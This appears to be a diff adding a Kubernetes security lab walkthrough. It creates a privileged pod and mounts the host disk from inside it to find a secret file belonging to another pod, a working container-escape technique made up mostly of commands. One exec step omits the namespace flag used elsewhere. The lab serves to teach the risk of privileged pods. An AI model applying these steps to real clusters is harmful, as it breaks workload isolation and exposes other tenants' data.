@@ -1,0 +1,58 @@
+#### Step 1 - Create a Non-Priveleged Super Secret Pod:
+```sh
+nano super-secret-pod.yaml
+```
+```sh
+apiVersion: v1
+kind: Pod
+metadata:
+  name: super-secret
+  namespace: development
+spec:
+  containers:
+  - image: nginx
+    name: demo-pod
+```
+```sh
+kubectl apply -f super-secret-pod.yaml
+```
+#### Step 2 - Create a Privileged Pod:
+```sh
+nano privileged.yaml
+```
+```sh
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged
+  namespace: development
+spec:
+  containers:
+  - image: nginx
+    name: demo-pod
+    securityContext:
+      privileged: true
+```
+```sh
+kubectl apply -f privileged.yaml
+```
+#### Step 3 - Store Secret Data in Super Secret Pod:
+```sh
+kubectl exec -n development -it super-secret -- bash
+echo "TOP Secret" > /root/super-secret.txt
+```
+logout of the super-secret pod
+
+#### Step 4 - Connect to Privileged Pod:
+
+Note: The disk name might be different in your-case. Please ensure you use the right naming while mounting.
+```sh
+kubectl exec -it privileged -- bash
+mkdir /host-data
+```
+```sh
+mount /dev/vda1 /host-data
+cd /host-data
+cd /host-data/var/lib/docker/overlay2
+find . -name super-secret.txt
+```
